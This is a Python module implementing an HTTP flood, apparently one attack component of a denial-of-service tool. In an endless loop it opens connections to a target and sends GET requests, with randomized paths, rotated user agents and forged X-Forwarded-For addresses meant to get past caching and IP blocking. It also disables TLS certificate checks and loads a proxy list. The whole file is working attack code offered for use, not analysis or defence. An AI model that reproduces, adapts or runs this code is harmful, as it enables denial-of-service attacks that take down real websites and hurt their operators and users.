import socket
import random
import time
import ssl
import urllib.parse
from typing import Dict

class HTTPFlood:
    def __init__(self, args, config, stats, running, worker_id):
        self.target = args.target
        self.port = args.port
        self.config = config.get('http', {})
        self.stats = stats
        self.running = running
        self.worker_id = worker_id
        self.user_agents = config.get('user_agents', [])
        self.proxies = []
        if args.proxy_file:
            with open(args.proxy_file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
        
    def _random_path(self):
        paths = [
            f"/{self._rand_str(8)}?{self._rand_str(6)}={self._rand_str(10)}",
            f"/{self._rand_str(5)}/{self._rand_str(8)}",
            f"/search?q={self._rand_str(12)}",
            f"/api/v1/{self._rand_str(6)}",
            f"/wp-content/{self._rand_str(10)}.php",
        ]
        return random.choice(paths)
    
    def _rand_str(self, length):
        return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=length))
    
    def _build_request(self):
        path = self._random_path() if self.config.get('randomize_path', True) else "/"
        ua = random.choice(self.user_agents) if self.user_agents else "TINUBULUX/1.0"
        
        req = f"GET {path} HTTP/1.1\r\n"
        req += f"Host: {self.target}\r\n"
        req += f"User-Agent: {ua}\r\n"
        req += "Accept: */*\r\n"
        req += "Accept-Language: en-US,en;q=0.9\r\n"
        req += "Accept-Encoding: gzip, deflate\r\n"
        req += "Connection: keep-alive\r\n"
        req += "Cache-Control: no-cache\r\n"
        req += f"X-Forwarded-For: {self._random_ip()}\r\n"
        req += f"X-Request-ID: {self._rand_str(16)}\r\n"
        req += "\r\n"
        return req.encode()
    
    def _random_ip(self):
        return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    
    def _get_socket(self):
        try:
            if self.port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.config.get('timeout', 5))
                return context.wrap_socket(sock, server_hostname=self.target)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.config.get('timeout', 5))
                return sock
        except:
            return None
    
    def attack(self):
        while self.running.value:
            try:
                sock = self._get_socket()
                if not sock:
                    with self.stats['failed'].get_lock():
                        self.stats['failed'].value += 1
                    continue
                
                sock.connect((self.target, self.port))
                request = self._build_request()
                sock.sendall(request)
                
                with self.stats['sent'].get_lock():
                    self.stats['sent'].value += 1
                    self.stats['bps'].value += len(request)
                
                if self.config.get('keep_alive', True):
                    try:
                        sock.recv(4096)
                    except:
                        pass
                
                sock.close()
                
            except Exception as e:
                with self.stats['failed'].get_lock():
                    self.stats['failed'].value += 1
                time.sleep(0.01)
